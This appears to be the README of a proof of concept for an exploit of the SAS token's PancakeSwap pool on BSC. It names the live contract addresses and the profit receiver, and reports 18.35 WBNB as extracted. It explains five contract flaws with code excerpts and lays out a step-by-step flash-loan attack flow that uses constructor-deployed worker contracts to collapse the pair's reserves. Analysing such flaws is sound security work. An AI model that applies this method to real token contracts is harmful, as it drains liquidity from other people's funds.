# SAS-11k-PoC
>
>| Field | Value |
>|-------|-------|
>| Token | SAS Token (`0xbFa266aEb18D34ef4f8749fc7a1B2064Af3D91c6`) |
>| Pair | SAS/WBNB PancakeSwap V2 (`0x2e456142b1998e711f61021D2467caD85AfD1963`) |
>| Chain | BSC |
>| Extracted | **18.35 WBNB** |
>| Profit receiver | `0x5664321ca640Df129A0304c5b5e7C9dB114eBae3` |
>
>| # | Address | Admin | allUserSellEnabled | Liquidity | Exploitable |
>|---|---------|-------|-------------------|-----------|-------------|
>| 1 | `0x9d03B88C24773Eca809aeEE00DEFCfacc881327a` | `0xf7F7A455a55451F46EB4a88d4Ca7ddf79ac0F9B0` | false (never enabled) | 3 WBNB (admin-drained) | No |
>| 2 | `0xbFa266aEb18D34ef4f8749fc7a1B2064Af3D91c6` | `0x4ad3c29CADD7ba8e317f7Ed8e1C19e413482D27A` | **true** | 20.19 WBNB | **Yes** |
>| 3 | `0x74Dfd150a956E5C0052d653B1F7ba464aD9574a2` | `0x4ad3c29CADD7ba8e317f7Ed8e1C19e413482D27A` | N/A | 0 (never funded) | No |

deployment #2 is the only one exploitable via non-admin vectors because `allUserSellEnabled = true` grants access to `_autoSell`, which is the prerequisite for `sellBurn` accumulation.

## Root cause

The SAS contract overrides `transfer()` with complex custom logic (fees, burns, whitelists, anti-bot) but **does not override `transferFrom()`**, all custom security relies on `transfer()` and is entirely bypassable via standard `transferFrom()`.

- `_isContract()` uses `extcodesize` which returns 0 during constructor execution, allowing contracts to masquerade as EOAs
- `sellBurn += amount` records the gross amount (100%) while the pair only receives 95% (after fee), creating net deflation on every burn cycle
- `_burnFromPair()` calls `sync()` on the pair, enabling atomic reserve manipulation within a single transaction

---

### V1 - bypass via constructor

```solidity
function _isContract(address a) internal view returns (bool) {
    uint256 s; assembly { s := extcodesize(a) }
    return s > 0;
}
```

during constructor execution, `extcodesize == 0`, the contract passes the `forbidContractTrade` check and is treated as an EOA.

### V2 - `sellBurn` accumulates FULL amount

```solidity
if(to == pancakeSwapPair) {
    _autoSell(from, amount);     // swaps 95% after 5% fee
    sellBurn = sellBurn + amount; // accumulates 100%, not 95%
    return true;
}
```

pair receives 95% via the router swap, but `sellBurn` records 100%, the subsequent burn removes more tokens from the pair than were added.

### V3 - Deferred `burn` + `sync()` collapses pair reserves

```solidity
function _burnFromPair(uint256 amount) internal {
    _burn(pancakeSwapPair, amount);
    IUniswapV2Pair(pancakeSwapPair).sync();
}
```

Triggered on any non-sell `transfer()` when `sellBurn > 0`. Burns tokens directly from the pair and forces reserve update via `sync()`.

### V4 - `transferFrom()` not overridden

```solidity
// ERC20.sol (OpenZeppelin) - NOT overridden in SAS
function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
    _spendAllowance(from, _msgSender(), amount);
    _transfer(from, to, amount);
    return true;
}
```

`transfer()` is overridden with custom logic. `transferFrom()` remains standard ERC20. Complete bypass: 0% fee, no anti-bot, no sellWhitelist, no sellBurn accumulation.

### V5 - `_isBuy()` returns false for contracts

```solidity
function _isBuy(address from, address to) internal view returns (bool) {
    return (from == pancakeSwapRouter || from == pancakeSwapPair) && !_isContract(to);
}
```

for a contract recipient (`_isContract(to) = true`), `_isBuy` returns `false`. No `buyWhitelist` check and no buy fee applied.

---

## Precondition

`allUserSellEnabled` must be `true` for `_autoSell` to be accessible without explicit whitelist membership

```solidity
require(allUserSellEnabled || sellWhitelist[seller] || whitelist[seller], "Not in sell whitelist");
```

Without this, the V1+V2 chain (sellBurn via _autoSell) is blocked, only deployment #2 meets this condition on-chain.

---

## state at block 90107282

```
SAS token      : 0xbFa266aEb18D34ef4f8749fc7a1B2064Af3D91c6
SAS pair       : 0x2e456142b1998e711f61021D2467caD85AfD1963
token0         : WBNB
Reserve WBNB   : 20,194,632,450,524,216,126 (20.19 WBNB)
Reserve SAS    : 209,893,079,634,451,319,291,830,870 (~209.89M SAS)
sellBurn       : 0
Moolah WBNB    : 383,252 WBNB (flashloan pool)
```

---

| Contract | Role | Vulnerability |
|----------|------|---------------|
| `SellWorker` | Deployed in constructor: sells SAS via `_autoSell` | V1 + V2 |
| `BurnWorker` | Deployed in constructor: self-transfer triggers burn | V1 + V3 |
| `SwapHelper` | Sells remaining SAS via `transferFrom` + Router | V4 |

---

<img width="565" height="368" alt="image" src="https://github.com/user-attachments/assets/ce496026-d3d7-40ff-8b40-1982abe92314" />

## Exec flow

```
SASExploitV2.attack(buyTargetSAS)
  |
  |-- WBNB.approve(Moolah, max)
  |-- Moolah.flashLoan(WBNB, 200,000)
  |     |
  |     |-- onMoolahFlashLoan()
  |     |     |
  |     |     |-- [STEP 1] Buy SAS via Router
  |     |     |     Router.swap(WBNB -> SAS)
  |     |     |     pair.swap -> SAS.transfer(ExploitV2, ~200M SAS)
  |     |     |     _isBuy = false (ExploitV2 is a contract) [V5]
  |     |     |     -> 0% buy fee, no buyWhitelist check
  |     |     |
  |     |     |-- [STEP 2] Deploy SellWorker (constructor)
  |     |     |     extcodesize == 0 -> anti-bot bypassed [V1]
  |     |     |     provideSAS() -> transferFrom (standard ERC20) [V4]
  |     |     |     SAS.transfer(pair, ~120M) -> _autoSell
  |     |     |       5% fee -> rewardAddress
  |     |     |       swap 95% via Router -> BNB to Worker
  |     |     |       sellBurn += 120M (FULL amount) [V2]
  |     |     |     wrap BNB -> WBNB, send to ExploitV2
  |     |     |
  |     |     |-- [STEP 3] Deploy BurnWorker (constructor)
  |     |     |     extcodesize == 0 -> anti-bot bypassed [V1]
  |     |     |     provideSAS() -> transferFrom 1 SAS [V4]
  |     |     |     SAS.transfer(self, 1)
  |     |     |       _burnFromPair(sellBurn=120M) [V3]
  |     |     |       _burn(pair, 120M SAS)
  |     |     |       pair.sync() -> reserves collapse
  |     |     |       *** PAIR: ~34 WBNB, 1 SAS ***
  |     |     |
  |     |     |-- [STEP 4] Deploy SwapHelper
  |     |     |     approve(helper, remaining SAS)
  |     |     |     helper.sellFeeFree()
  |     |     |       transferFrom(ExploitV2, helper, ~80M SAS) [V4]
  |     |     |       Router.swap(SAS -> WBNB)
  |     |     |         SAS.transferFrom (standard ERC20) [V4]
  |     |     |         0% sell fee, no sellWhitelist
  |     |     |       -> extracts remaining WBNB
  |     |     |       WBNB.transfer(ExploitV2, profit)
  |     |     |
  |     |     |-- Moolah repays via transferFrom(WBNB)
  |     |
  |-- WBNB.transfer(profitReceiver, profit)
  |
  v
profitReceiver: +18.35 WBNB
```
